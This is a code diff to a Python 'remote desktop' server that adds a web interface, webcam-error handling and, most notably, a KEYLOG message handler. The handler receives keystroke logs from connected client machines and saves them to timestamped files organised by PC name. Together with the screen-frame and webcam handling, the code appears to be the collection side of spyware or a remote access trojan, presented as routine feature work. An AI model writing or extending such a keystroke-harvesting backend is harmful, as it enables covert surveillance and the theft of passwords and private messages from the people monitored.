@@ -8,19 +8,26 @@ import argparse
 import sys
 import logging
 from pathlib import Path
-import tkinter as tk
-from tkinter import messagebox
-from PIL import Image, ImageTk
 import io
 import threading
 import platform
+import datetime
+
+# Try to import tkinter (optional - only needed for GUI mode)
+try:
+    import tkinter as tk
+    from tkinter import messagebox
+    from PIL import Image, ImageTk
+    TKINTER_AVAILABLE = True
+except ImportError:
+    TKINTER_AVAILABLE = False
 
 # Add parent directory to path
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 from config import (
     DEFAULT_SERVER_HOST, DEFAULT_SERVER_PORT,
-    SERVER_CERT, SERVER_KEY, CA_CERT, SERVER_LOG
+    SERVER_CERT, SERVER_KEY, CA_CERT, SERVER_LOG, KEYLOG_FILE, KEYLOG_ENABLED
 )
 from common.protocol import FrameEncoder, ProtocolHandler, MessageType
 
@@ -32,14 +39,20 @@ except ImportError:
     USE_EMBEDDED_CERTS = False
 
 # Configure logging
+handlers = [logging.StreamHandler()]
+if SERVER_LOG:
+    handlers.append(logging.FileHandler(SERVER_LOG))
+
 logging.basicConfig(
-    level=logging.DEBUG,  # Changed to DEBUG for better diagnostics
+    level=logging.INFO,  # Changed from DEBUG to INFO to reduce noise
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    handlers=[
-        logging.FileHandler(SERVER_LOG),
-        logging.StreamHandler()
-    ]
+    handlers=handlers
 )
+
+# Suppress eventlet connection errors (they're harmless)
+logging.getLogger('eventlet.wsgi').setLevel(logging.ERROR)
+logging.getLogger('eventlet.greenio').setLevel(logging.ERROR)
+
 logger = logging.getLogger(__name__)
 
 class RemoteDesktopServer:
@@ -51,6 +64,12 @@ class RemoteDesktopServer:
         self.clients = {}
         self.frame_buffer = {}
         self.gui_callback = None  # Callback for GUI notifications
+        self.webcam_error_callback = None  # Callback for webcam errors
+        
+        # Setup keylog file
+        if KEYLOG_ENABLED and KEYLOG_FILE:
+            KEYLOG_FILE.parent.mkdir(parents=True, exist_ok=True)
+            logger.info(f"Keylog file: {KEYLOG_FILE}")
         
     def create_ssl_context(self):
         """Create SSL context for secure connection"""
@@ -247,47 +266,104 @@ class RemoteDesktopServer:
                         logger.warning(f"Incomplete data from {client_id}: expected {length}, got {len(data)}")
                         break
                     
-                    # Decode frame
+                    # Decode message
                     try:
-                        msg_type, frame_id, is_delta, delta_rect, frame_data = FrameEncoder.decode_frame(data)
+                        # First, check message type to determine how to decode
+                        if len(data) < 1:
+                            logger.warning(f"Message too short from {client_id}")
+                            continue
                         
-                        frames_received += 1
-                        if frames_received <= 5 or frames_received % 10 == 0:
-                            pc_name = self.clients.get(client_id, {}).get('pc_name', client_id)
-                            logger.info(f"Received frame from {pc_name} (total: {frames_received}, type: {msg_type.name}, size: {len(frame_data)} bytes)")
-                            print(f"Received frame from {pc_name} (total: {frames_received})")  # Also print to stdout
+                        msg_type_byte = data[0]
                         
-                        if msg_type == MessageType.SCREEN_FRAME:
-                            # Full frame
-                            self.frame_buffer[client_id] = {
-                                'frame_data': frame_data,
-                                'frame_id': frame_id,
-                                'is_delta': False
-                            }
-                            logger.debug(f"Received full frame from {client_id} ({len(frame_data)} bytes)")
-                        elif msg_type == MessageType.DELTA_UPDATE:
-                            # Delta update - apply to existing frame
-                            if client_id in self.frame_buffer:
-                                # In a real implementation, you'd merge the delta
-                                # For simplicity, we'll just update the buffer
-                                self.frame_buffer[client_id] = {
-                                    'frame_data': frame_data,
-                                    'frame_id': frame_id,
-                                    'is_delta': True,
-                                    'delta_rect': delta_rect
-                                }
-                            else:
-                                # No previous frame, treat as full frame
+                        # Check if it's a frame message (SCREEN_FRAME or DELTA_UPDATE)
+                        if msg_type_byte in (int(MessageType.SCREEN_FRAME), int(MessageType.DELTA_UPDATE)):
+                            msg_type, frame_id, is_delta, delta_rect, frame_data = FrameEncoder.decode_frame(data)
+                            
+                            frames_received += 1
+                            if frames_received <= 5 or frames_received % 10 == 0:
+                                pc_name = self.clients.get(client_id, {}).get('pc_name', client_id)
+                                logger.info(f"Received frame from {pc_name} (total: {frames_received}, type: {msg_type.name}, size: {len(frame_data)} bytes)")
+                                print(f"Received frame from {pc_name} (total: {frames_received})")  # Also print to stdout
+                            
+                            if msg_type == MessageType.SCREEN_FRAME:
+                                # Full frame
                                 self.frame_buffer[client_id] = {
                                     'frame_data': frame_data,
                                     'frame_id': frame_id,
                                     'is_delta': False
                                 }
-                        elif msg_type == MessageType.HEARTBEAT:
+                                logger.debug(f"Received full frame from {client_id} ({len(frame_data)} bytes)")
+                            elif msg_type == MessageType.DELTA_UPDATE:
+                                # Delta update - apply to existing frame
+                                if client_id in self.frame_buffer:
+                                    # In a real implementation, you'd merge the delta
+                                    # For simplicity, we'll just update the buffer
+                                    self.frame_buffer[client_id] = {
+                                        'frame_data': frame_data,
+                                        'frame_id': frame_id,
+                                        'is_delta': True,
+                                        'delta_rect': delta_rect
+                                    }
+                                else:
+                                    # No previous frame, treat as full frame
+                                    self.frame_buffer[client_id] = {
+                                        'frame_data': frame_data,
+                                        'frame_id': frame_id,
+                                        'is_delta': False
+                                    }
+                        elif msg_type_byte == int(MessageType.HEARTBEAT):
                             # Heartbeat - just acknowledge
-                            pass
+                            logger.debug(f"Received heartbeat from {client_id}")
+                        elif msg_type_byte == int(MessageType.WEBCAM_ERROR):
+                            # Webcam error - decode and log
+                            try:
+                                msg_type, msg_data = ProtocolHandler.decode_message(data)
+                                error_msg = msg_data.decode('utf-8')
+                                logger.warning(f"Webcam error from {client_id}: {error_msg}")
+                                # Forward to web interface if callback is set
+                                if self.webcam_error_callback:
+                                    try:
+                                        self.webcam_error_callback(client_id, error_msg)
+                                    except Exception as cb_err:
+                                        logger.error(f"Error in webcam error callback: {cb_err}")
+                            except Exception as decode_err:
+                                logger.error(f"Failed to decode webcam error: {decode_err}")
+                        elif msg_type_byte == int(MessageType.KEYLOG):
+                            # Keylog message
+                            logger.info(f"Received KEYLOG message from {client_id}")
+                            try:
+                                msg_type, msg_data = ProtocolHandler.decode_message(data)
+                                log_content = msg_data.decode('utf-8')
+                                pc_name = self.clients.get(client_id, {}).get('pc_name', client_id)
+                                logger.info(f"Keylog from {pc_name}: {len(log_content)} characters")
+                                
+                                # Save to file if enabled
+                                if KEYLOG_ENABLED and KEYLOG_FILE:
+                                    try:
+                                        # Create directory for this client
+                                        client_dir = KEYLOG_FILE.parent / pc_name
+                                        client_dir.mkdir(parents=True, exist_ok=True)
+                                        
+                                        # Extract filename from log content (first line should have it)
+                                        # Or create new filename with timestamp
+                                        timestamp = datetime.datetime.now().strftime("%d.%m.%Y_%H.%M.%S")
+                                        log_filename = f"{pc_name}_{timestamp}.txt"
+                                        log_filepath = client_dir / log_filename
+                                        
+                                        # Write log content
+                                        with open(log_filepath, 'w', encoding='utf-8') as f:
+                                            f.write(log_content)
+                                        
+                                        logger.info(f"Keylog saved to: {log_filepath}")
+                                        print(f"[KEYLOG] Saved {pc_name}: {log_filepath.name} ({len(log_content)} chars)")
+                                    except Exception as file_err:
+                                        logger.error(f"Error writing keylog to file: {file_err}")
+                            except Exception as decode_err:
+                                logger.error(f"Failed to decode keylog: {decode_err}")
+                                import traceback
+                                logger.error(traceback.format_exc())
                         else:
-                            logger.warning(f"Unknown message type: {msg_type}")
+                            logger.warning(f"Unknown message type from {client_id}: {msg_type_byte}")
                         
                     except ValueError as ve:
                         logger.warning(f"Frame decode error (ValueError) from {client_id}: {ve} - skipping frame")
@@ -705,21 +781,66 @@ class RemoteDesktopViewer:
         self.running = False
         self.root.destroy()
 
-def run_server(host: str, port: int, gui: bool = True):
-    """Run server with optional GUI"""
+def run_server(host: str, port: int, gui: bool = True, web: bool = False, web_port: int = 5000):
+    """Run server with optional GUI or web interface"""
     server = RemoteDesktopServer(host, port)
+    
+    # Store the event loop reference
+    server_loop = None
     
     # Start server in background thread
     def run_server_async():
-        asyncio.run(server.start_server())
+        nonlocal server_loop
+        server_loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(server_loop)
+        server_loop.run_until_complete(server.start_server())
     
     server_thread = threading.Thread(target=run_server_async, daemon=True)
     server_thread.start()
     
+    # Wait for event loop to be created
+    import time
+    for _ in range(50):  # Wait up to 5 seconds
+        if server_loop:
+            break
+        time.sleep(0.1)
+    
+    if web:
+        # Start web server
+        try:
+            from server.web_server import init_web_server, run_web_server
+            init_web_server(server, server_loop)  # Pass the event loop
+            # Run web server in a separate thread
+            web_thread = threading.Thread(
+                target=run_web_server,
+                args=('0.0.0.0', web_port),
+                daemon=True
+            )
+            web_thread.start()
+            logger.info(f"Web server started on port {web_port}")
+            logger.info(f"Open http://localhost:{web_port} in your browser")
+        except ImportError:
+            logger.error("Web server dependencies not available. Install: pip install Flask flask-socketio eventlet")
+            logger.info("Falling back to GUI mode")
+            gui = True
+    
     if gui:
         # Start GUI viewer
+        if not TKINTER_AVAILABLE:
+            logger.error("GUI mode requested but tkinter not available. Use --web instead.")
+            print("ERROR: GUI mode not available. Run with --web flag for web interface.")
+            sys.exit(1)
         viewer = RemoteDesktopViewer(server)
         viewer.run()
+    elif web:
+        # Web mode - keep main thread alive
+        try:
+            logger.info("Server running. Press Ctrl+C to stop.")
+            while True:
+                import time
+                time.sleep(1)
+        except KeyboardInterrupt:
+            logger.info("Server stopped")
     else:
         # Headless mode - just run server
         try:
@@ -733,10 +854,12 @@ def main():
     parser.add_argument('--host', default=DEFAULT_SERVER_HOST, help='Server host')
     parser.add_argument('--port', type=int, default=DEFAULT_SERVER_PORT, help='Server port')
     parser.add_argument('--no-gui', action='store_true', help='Run in headless mode')
+    parser.add_argument('--web', action='store_true', help='Run web interface')
+    parser.add_argument('--web-port', type=int, default=5000, help='Web server port')
     
     args = parser.parse_args()
     
-    run_server(args.host, args.port, gui=not args.no_gui)
+    run_server(args.host, args.port, gui=not args.no_gui and not args.web, web=args.web, web_port=args.web_port)
 
 if __name__ == "__main__":
     main()
